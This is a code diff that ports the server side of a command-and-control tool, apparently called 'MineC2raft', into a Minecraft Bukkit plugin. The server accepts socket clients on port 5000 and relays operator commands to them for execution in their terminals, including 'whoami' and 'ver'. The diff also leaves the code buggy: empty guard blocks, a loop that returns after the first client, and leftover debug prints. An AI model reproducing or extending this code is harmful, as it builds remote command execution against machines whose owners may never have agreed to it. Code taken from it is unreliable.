@@ -7,6 +7,13 @@ import java.net.ServerSocket;
 import java.net.Socket;
 import java.util.concurrent.CopyOnWriteArrayList;
 
+import org.bukkit.Bukkit;
+import org.bukkit.plugin.java.JavaPlugin;
+import org.bukkit.scheduler.BukkitScheduler;
+import org.bukkit.scheduler.BukkitTask;
+
+import com.minec2raft.BridgeConnection;
+
 /**@author Austin Hall
  * Main server class that handles communication between multiple clients using the Client class.
  * Server code modified for compatibility with minecraft plugins
@@ -15,14 +22,14 @@ import java.util.concurrent.CopyOnWriteArrayList;
  */
 public class Server {
 
-    //Escape codes or sommn for different colors. 
-    private static final String RED = "\u001B[31m";
-    private static final String GREEN = "\u001B[32m";
-    private static final String YELLOW = "\u001B[33m";
-    private static final String RESET = "\u001B[0m";
+    //Escape codes or sommn for different colors (now changed for minecraft color coding). 
+    private static final String RED = "§4";
+    private static final String GREEN = "§2";
+    private static final String YELLOW = "§e";
+    private static final String RESET = "§f";
 
     private static boolean exists = false;
-    private static Thread connectionThread;
+    private static BukkitTask connectionThread;
     
     
     private static final double VERSION_NUM = 0.02; //version number (change when I feel cheeky ;)
@@ -36,6 +43,7 @@ public class Server {
     public Server(){
         try {
             serverSocket = new ServerSocket(5000);
+            System.out.println("Server Ready.");
             exists = true;
         } catch(IOException e) {
             
@@ -47,11 +55,12 @@ public class Server {
      * runs all of the code relating to client / server communication, and handles user input for commands.
      * @throws IOException
      */
-    public void runServer() throws IOException {
+    public void runServer(JavaPlugin plugin) throws IOException {
         System.out.println(GREEN + "Server Created. Listening for clients..." + RESET);
 
-        //thread to handle communications between server any any clients
-        connectionThread = new Thread(() -> {
+        //schedule bukkit thread to handle communications between server any any clients
+
+        connectionThread = Bukkit.getScheduler().runTaskAsynchronously(plugin, () -> {
             try {
                 while(true) {
                     Socket clientSocket = serverSocket.accept();
@@ -61,12 +70,12 @@ public class Server {
                     clients.add(handler);
                     handler.start(); 
                     
+                    Bukkit.getScheduler().runTaskAsynchronously(plugin, handler);
                 }
             } catch (IOException e) {
                 System.out.println(RED + "Client thread stopped." + RESET);
             }
         });
-        connectionThread.start();
 
         // Start user input listening.
         BufferedReader userReader = new BufferedReader(new InputStreamReader(System.in));
@@ -83,16 +92,17 @@ public class Server {
      * Some special commands have been added for ease of use, and any non-special commands will be interpreted through the client's terminal.
      * @param cmd - the user input.
      */
-    public static void commandHandler(String cmd) {
+    public static String commandHandler(String cmd) {
         String reply;
+        String returnStr = "";
         switch(cmd) {
             case "os", "version":
                 reply = "ver";
-                broadcast(reply, null);
+                returnStr = broadcast(reply, null);
                 break;
             case "user", "client":
                 reply = "whoami";
-                broadcast(reply, null);
+                returnStr = broadcast(reply, null);
                 break;
             case "coms", "commands", "cmds", "HELP": 
                 reply = "               ********** MineC2raft Commands ***********\n\t\t" 
@@ -128,10 +138,10 @@ public class Server {
                 System.out.println("\n" + YELLOW  + "Broadcast Complete." + "\u001B[0m");
                 break;                
             default: 
-                broadcast(cmd, null);
+                returnStr = broadcast(cmd, null);
                 break;  
         }
-        
+        return returnStr;
     }
 
     public static String broadcastDestinationHandler() {
@@ -153,33 +163,38 @@ public class Server {
     /** 
      * Broadcasts commands to all clients - if the message does not have "CMD: " at the start, the client WILL NOT interpret the message.
      */
-    public static void broadcast(String msg, ClientHandler sender) {
+    public static String broadcast(String msg, ClientHandler sender) {
+        System.out.println("Made it!");
 
         if(msg == null || msg.trim().isEmpty() || msg.equals("__END__")) {
-            return;
+            
         }
         if(clients.isEmpty()) {
             System.out.println(RED + "No clients connected." + RESET);
-            return;
+            
         }
-        System.out.println("\nWhere do you want to send this command?");
-        String response = broadcastDestinationHandler();
+        // System.out.println("\nWhere do you want to send this command?");
+        // String response = broadcastDestinationHandler();
+        String response = "all";
 
         if(response != null) {
             if(response.equals("all")) {
                 for(ClientHandler client : clients) {
                     if (client != sender) {
                         client.sendMessage("CMD: " + msg);
+                        return client.getRecentLn();
                     }
                 }
             } else {
                 try {
                     clients.get(Integer.parseInt(response)).sendMessage("CMD: " + msg);
+                    return clients.get(Integer.parseInt(response)).getRecentLn();
                 } catch(Exception e) {
                     System.out.println("Not a valid option.");
                 }
             }
         }
+        return null;
     }
 
     public static void formatArrLst() {
@@ -192,6 +207,7 @@ public class Server {
             System.out.println(YELLOW + i + ": " + RESET + clients.get(i).getInetAddr() + ", Port " + clients.get(i).getPort());
         }
     }
+
     /**
      * lets hope this correctly checks to see if we've ever made a server, so that people can't make more than one.
      * @return whether or not a server is enabled
@@ -202,7 +218,8 @@ public class Server {
 
     public static void stopServer() {
         try {
-            connectionThread.interrupt();
+            serverSocket.close();
+
         } catch(Exception e) {
             System.out.println("Error stopping server: " + e);
         }
